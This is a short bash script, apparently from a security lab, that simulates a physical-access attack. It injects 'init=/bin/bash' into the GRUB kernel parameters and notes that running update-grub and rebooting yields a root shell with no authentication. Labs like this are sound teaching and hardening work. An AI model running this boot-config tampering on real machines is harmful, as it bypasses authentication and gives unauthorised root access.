#!/bin/bash
# BREAK: Inject malicious boot parameters into GRUB config
# Simulates what an attacker does with physical access and no GRUB password
# On real hardware this would boot to root shell with no authentication

# Backup original
cp /etc/default/grub /etc/default/grub.bak

# Inject init=/bin/bash — bypasses systemd, boots to root shell
sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"/GRUB_CMDLINE_LINUX_DEFAULT="quiet splash init=\/bin\/bash"/' /etc/default/grub

echo "[BREAK] injected boot parameters:"
grep CMDLINE /etc/default/grub
echo "[BREAK] on real hardware: update-grub && reboot to get root shell"
echo "[BREAK] alternative parameter: add 'single' for single-user mode"
